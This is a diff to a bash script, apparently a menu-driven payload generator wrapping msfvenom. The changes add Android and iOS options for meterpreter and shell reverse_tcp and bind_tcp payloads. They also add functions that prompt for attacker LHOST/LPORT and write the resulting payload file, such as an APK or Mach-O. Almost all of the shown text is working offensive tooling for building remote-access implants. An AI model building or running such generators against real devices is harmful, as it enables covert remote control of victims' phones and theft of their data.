@@ -2,6 +2,14 @@
 
 
 
+if [ "$(id -u)" != "0" ]; then
+
+    echo "This script must be run as root" 1>&2
+
+    exit 1
+
+fi
+
 
 
 # Define Colors
@@ -570,59 +578,51 @@ linux_payload() {
 
 android_payload() {
 
+    clear
 
-
-   clear
-
-    figlet "PAYLOAD TYPE" | lolcat
+    figlet "ANDROID PAYLOAD TYPE" | lolcat
 
     echo ""
 
     echo $orange"+------------------------------------------+"
 
-    echo $orange"|$white [1] $yellow android/meterpreter/reverse_tcp$orange   |"
+    echo $orange"|$white [1] $yellow android/meterpreter/reverse_tcp$orange  |"
 
-    echo $orange"|$white [2] $yellow $orange   |"
+    echo $orange"|$white [2] $yellow android/shell/reverse_tcp$orange       |"
 
     echo $orange"+------------------------------------------+"
 
     echo ""
 
-    echo $okegreen"Choose Payload Type: ";tput sgr0
+    echo $okegreen"Choose Payload Type: "; tput sgr0
 
     read android_payload_type
 
     
 
-
-
     case $android_payload_type in
-
-
 
         1)
 
             export android_payload_type="android/meterpreter/reverse_tcp"
 
-            ;;
+            android_msfvenom
 
-            
+            ;;
 
         2)
 
-            
+            export android_payload_type="android/shell/reverse_tcp"
+
+            android_msfvenom
 
             ;;
 
-           
-
-       *)
-
-       
+        *)
 
             echo ""
 
-            echo -e $red "Invalid option, choose between 1 and 10"
+            echo -e $red "Invalid option, choose 1 or 2"
 
             clear
 
@@ -636,13 +636,13 @@ android_payload() {
 
 
 
+
+
 # msfvenom payloads for ios
 
 ios_payload() {
 
-
-
-   clear
+    clear
 
     figlet "PAYLOAD TYPE" | lolcat
 
@@ -650,41 +650,53 @@ ios_payload() {
 
     echo $orange"+------------------------------------------+"
 
-    echo $orange"|$white [1] $yellow linux/x86/meterpreter/reverse_tcp$orange   |"
+    echo $orange"|$white [1] $yellow ios/meterpreter/reverse_tcp$orange   |"
 
-    echo $orange"|$white [2] $yellow linux/x64/meterpreter/reverse_tcp$orange   |"
+    echo $orange"|$white [2] $yellow ios/meterpreter/bind_tcp$orange       |"
+
+    echo $orange"|$white [3] $yellow ios/shell/reverse_tcp$orange          |"
 
     echo $orange"+------------------------------------------+"
 
     echo ""
 
-    echo $okegreen"Choose Payload Type: ";tput sgr0
+    echo $okegreen"Choose Payload Type: "; tput sgr0
 
     read ios_payload_type
 
     
 
-
-
     case $ios_payload_type in
 
-
-
-       2)
+        1)
 
             export ios_payload_type="ios/meterpreter/reverse_tcp"
 
+            ios_msfvenom
+
             ;;
 
-            
+        2)
 
-       *)
+            export ios_payload_type="ios/meterpreter/bind_tcp"
 
-       
+            ios_msfvenom
+
+            ;;
+
+        3)
+
+            export ios_payload_type="ios/shell/reverse_tcp"
+
+            ios_msfvenom
+
+            ;;
+
+        *)
 
             echo ""
 
-            echo -e $red "Invalid option, choose between 1 and 10"
+            echo -e $red "Invalid option, choose 1-3"
 
             clear
 
@@ -1077,6 +1089,158 @@ if [ $? -eq 0 ]; then
             echo "Press [ENTER] to return to the menu."
 
             read cont
+
+}
+
+
+
+ios_msfvenom() {
+
+    echo
+
+    echo
+
+    echo
+
+    show_ip_addresses
+
+    echo
+
+    echo
+
+    read -p "Enter LHOST (e.g., \"192.168.1.5\") " H3
+
+    echo
+
+    read -p "Enter LPORT (e.g., \"4444\") " P3
+
+    echo
+
+    read -p "Enter Payload Format (e.g., \"macho\") " format3
+
+    echo
+
+    read -p "Enter Payload save path (e.g., \"/home/kali\"): " S3
+
+    echo
+
+    read -p "Enter Payload name (e.g., \"Payload.macho\"): " name3
+
+    echo
+
+    echo    "Creating Payload..."
+
+    echo
+
+    msfvenom -p $ios_payload_type LHOST=$H3 LPORT=$P3 -f $format3 -o $S3/$name3
+
+
+
+    if [ $? -eq 0 ]; then
+
+        clear
+
+        figlet "M S F V E N O M" | lolcat
+
+        echo
+
+        echo
+
+        echo "Payload created successfully!"
+
+        echo
+
+        echo "Payload Path: $S3/$name3"
+
+    else
+
+        clear
+
+        figlet "M S F V E N O M" | lolcat
+
+        echo "Error: invalid options try again with correct options."
+
+    fi
+
+    echo
+
+    echo "Press [ENTER] to return to the menu."
+
+    read cont
+
+}
+
+
+
+android_msfvenom() {
+
+    echo
+
+    echo
+
+    echo
+
+    show_ip_addresses
+
+    echo
+
+    echo
+
+    read -p "Enter LHOST (e.g., \"192.168.1.5\") " H4
+
+    echo
+
+    read -p "Enter LPORT (e.g., \"4444\") " P4
+
+    echo
+
+    read -p "Enter Payload save path (e.g., \"/home/kali\"): " S4
+
+    echo
+
+    read -p "Enter Payload name (e.g., \"Payload.apk\"): " name4
+
+    echo
+
+    echo    "Creating Payload..."
+
+    echo
+
+    msfvenom -p $android_payload_type LHOST=$H4 LPORT=$P4 -o $S4/$name4
+
+
+
+    if [ $? -eq 0 ]; then
+
+        clear
+
+        figlet "M S F V E N O M" | lolcat
+
+        echo
+
+        echo
+
+        echo "Payload created successfully!"
+
+        echo
+
+        echo "Payload Path: $S4/$name4"
+
+    else
+
+        clear
+
+        figlet "M S F V E N O M" | lolcat
+
+        echo "Error: invalid options try again with correct options."
+
+    fi
+
+    echo
+
+    echo "Press [ENTER] to return to the menu."
+
+    read cont
 
 }
 
